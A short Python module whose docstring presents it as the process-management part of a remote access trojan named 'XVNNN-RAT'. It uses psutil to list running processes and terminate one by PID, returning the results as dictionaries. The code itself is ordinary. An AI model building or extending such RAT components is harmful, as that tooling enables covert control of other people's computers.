"""
Process management module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import psutil
import logging

logger = logging.getLogger(__name__)

class ProcessModule:
    """Process management module"""
    
    def __init__(self):
        self.name = "process"
    
    def list_processes(self):
        """Get running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    info = proc.info
                    processes.append({
                        'pid': info['pid'],
                        'name': info['name'],
                        'username': info['username'],
                        'cpu': info['cpu_percent'],
                        'memory': info['memory_percent']
                    })
                except:
                    pass
            
            return {'type': 'process_list', 'processes': processes}
        except Exception as e:
            logger.error(f"Process list error: {e}")
            return {'type': 'process_list', 'error': str(e)}
    
    def kill_process(self, pid):
        """Kill a process"""
        try:
            if pid:
                proc = psutil.Process(pid)
                proc.terminate()
                return {'type': 'process_kill', 'status': 'success', 'pid': pid}
            else:
                return {'type': 'process_kill', 'error': 'No PID specified'}
        except Exception as e:
            logger.error(f"Process kill error: {e}")
            return {'type': 'process_kill', 'error': str(e)}